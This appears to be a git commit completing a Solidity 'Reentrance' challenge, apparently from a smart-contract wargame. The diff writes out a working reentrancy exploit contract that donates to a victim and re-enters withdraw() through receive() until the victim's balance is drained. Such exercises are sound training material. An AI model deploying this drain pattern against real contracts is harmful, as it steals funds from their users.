abbc1929ef06f9141af6106646beb0e4c934e04a
Dan Simmons <dan@simmons.io>
2022-12-17 17:41:13 -0700

    Completed Reentrance challenge.

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,27 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance public victimContract;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        victimContract = Reentrance(_contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        victimContract.donate{value: address(this).balance}(address(this));
+        yoinkDonation();
+    }
+
+    function yoinkDonation() private {
+        if (contractAddress.balance == 0) {
+            return;
+        }
+
+        victimContract.withdraw();
+    }
+
+    receive() external payable {
+        yoinkDonation();
     }
 }
